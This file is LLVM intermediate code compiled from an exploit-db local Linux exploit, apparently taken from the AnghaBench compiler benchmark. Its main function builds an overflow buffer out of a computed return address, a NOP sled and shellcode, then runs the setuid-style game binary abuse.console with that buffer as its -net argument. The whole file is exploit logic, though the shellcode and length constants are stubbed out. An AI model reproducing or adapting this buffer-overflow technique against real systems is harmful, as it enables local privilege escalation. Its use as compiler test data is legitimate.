; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21980.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21980.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@LEN = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [25 x i8] c"\0AUsage :- %s <offset>\0A..\00", align 1
@RET = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [24 x i8] c"Using return Adress :- \00", align 1
@shellcode = common dso_local global i32 0, align 4
@NOP = common dso_local global i8 0, align 1
@.str.2 = private unnamed_addr constant [43 x i8] c"/usr/lib/games/abuse/abuse.console -net %s\00", align 1
@.str.3 = private unnamed_addr constant [18 x i8] c"executing .......\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca [1000 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %11 = load i32, i32* @LEN, align 4
  %12 = zext i32 %11 to i64
  %13 = call i8* @llvm.stacksave()
  store i8* %13, i8** %9, align 8
  %14 = alloca i8, i64 %12, align 16
  store i64 %12, i64* %10, align 8
  %15 = load i8**, i8*** %4, align 8
  %16 = getelementptr inbounds i8*, i8** %15, i64 0
  %17 = load i8*, i8** %16, align 8
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0), i8* %17)
  %19 = load i32, i32* %3, align 4
  %20 = icmp sgt i32 %19, 1
  br i1 %20, label %21, label %28

21:                                               ; preds = %2
  %22 = call i64 (...) @esp()
  %23 = load i8**, i8*** %4, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 1
  %25 = load i8*, i8** %24, align 8
  %26 = call i64 @atoi(i8* %25)
  %27 = sub nsw i64 %22, %26
  store i64 %27, i64* %8, align 8
  br label %30

28:                                               ; preds = %2
  %29 = load i64, i64* @RET, align 8
  store i64 %29, i64* %8, align 8
  br label %30

30:                                               ; preds = %28, %21
  %31 = load i64, i64* %8, align 8
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.1, i64 0, i64 0), i64 %31)
  store i32 0, i32* %6, align 4
  br label %33

33:                                               ; preds = %43, %30
  %34 = load i32, i32* %6, align 4
  %35 = load i32, i32* @LEN, align 4
  %36 = icmp slt i32 %34, %35
  br i1 %36, label %37, label %46

37:                                               ; preds = %33
  %38 = load i64, i64* %8, align 8
  %39 = load i32, i32* %6, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %14, i64 %40
  %42 = bitcast i8* %41 to i64*
  store i64 %38, i64* %42, align 1
  br label %43

43:                                               ; preds = %37
  %44 = load i32, i32* %6, align 4
  %45 = add nsw i32 %44, 4
  store i32 %45, i32* %6, align 4
  br label %33

46:                                               ; preds = %33
  store i32 0, i32* %6, align 4
  br label %47

47:                                               ; preds = %60, %46
  %48 = load i32, i32* %6, align 4
  %49 = load i32, i32* @LEN, align 4
  %50 = load i32, i32* @shellcode, align 4
  %51 = call i32 @strlen(i32 %50)
  %52 = add nsw i32 %51, 8
  %53 = sub nsw i32 %49, %52
  %54 = icmp slt i32 %48, %53
  br i1 %54, label %55, label %63

55:                                               ; preds = %47
  %56 = load i8, i8* @NOP, align 1
  %57 = load i32, i32* %6, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds i8, i8* %14, i64 %58
  store i8 %56, i8* %59, align 1
  br label %60

60:                                               ; preds = %55
  %61 = load i32, i32* %6, align 4
  %62 = add nsw i32 %61, 1
  store i32 %62, i32* %6, align 4
  br label %47

63:                                               ; preds = %47
  %64 = load i32, i32* %6, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %14, i64 %65
  %67 = load i32, i32* @shellcode, align 4
  %68 = load i32, i32* @shellcode, align 4
  %69 = call i32 @strlen(i32 %68)
  %70 = call i32 @memcpy(i8* %66, i32 %67, i32 %69)
  %71 = getelementptr inbounds [1000 x i8], [1000 x i8]* %5, i64 0, i64 0
  %72 = call i32 @sprintf(i8* %71, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.2, i64 0, i64 0), i8* %14)
  %73 = call i32 @puts(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.3, i64 0, i64 0))
  %74 = getelementptr inbounds [1000 x i8], [1000 x i8]* %5, i64 0, i64 0
  %75 = call i32 @system(i8* %74)
  %76 = load i8*, i8** %9, align 8
  call void @llvm.stackrestore(i8* %76)
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i64 @esp(...) #2

declare dso_local i64 @atoi(i8*) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i32 @sprintf(i8*, i8*, i8*) #2

declare dso_local i32 @puts(i8*) #2

declare dso_local i32 @system(i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
